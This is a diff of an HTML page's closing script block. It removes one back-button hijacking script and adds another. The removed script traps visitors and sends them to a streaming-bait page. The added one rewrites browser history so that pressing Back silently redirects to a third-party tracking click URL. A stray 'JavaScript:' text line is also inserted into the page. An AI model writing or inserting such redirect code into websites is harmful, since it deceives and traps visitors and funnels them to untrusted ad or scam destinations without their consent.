@@ -410,18 +410,20 @@ function timer() {
 }
 </script>
 
+JavaScript:
 <script>
-    ! function() {
-    var t;
-    try {
-        const URL = window.location.href.split(/[#]/)[0];
-        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
-        onpopstate = function(event) {
-            event.state && location.href.replace('https://unlockstreamingnow.com/watchstreamnow/');
-        }
-    } catch (o) {
-        console.log(o);
-    }
-}();
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://trck.hapecg.com/click");
+    },0);
+  }
+}, false);
+}(window, location));
 </script>
 </body></html>
